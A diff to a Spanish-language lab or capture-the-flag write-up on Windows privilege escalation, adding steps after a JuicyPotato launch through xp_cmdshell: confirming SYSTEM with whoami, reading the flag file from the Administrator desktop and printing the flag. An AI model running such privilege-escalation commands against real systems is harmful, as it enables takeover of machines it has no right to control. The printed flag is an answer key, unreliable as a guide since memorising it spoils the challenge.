@@ -551,5 +551,16 @@ xp_cmdshell C:\Tools\JuicyPotato.exe -l 53375 -p "C:\Windows\System32\cmd.exe" -
 
 En nuestra máquina atacante obtenemos el cmd:
 <img width="1209" height="271" alt="image" src="https://github.com/user-attachments/assets/b70450ea-f788-4280-a31f-4867e799df2f" />
-
+Ejecutamos el comando `whoami`:
 <img width="632" height="228" alt="image" src="https://github.com/user-attachments/assets/8d2003e3-76d6-44ab-92cb-2248cede598f" />
+
+Observamos que somos `SYSTEM`.
+
+Conseguimos la flag mediante el siguiente comando:
+```
+type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
+```
+
+<img width="1257" height="232" alt="image" src="https://github.com/user-attachments/assets/0ce8e60d-6bfd-41a5-838d-62655810729b" />
+
+`Falg`: `F3ar_th3_p0tato!`
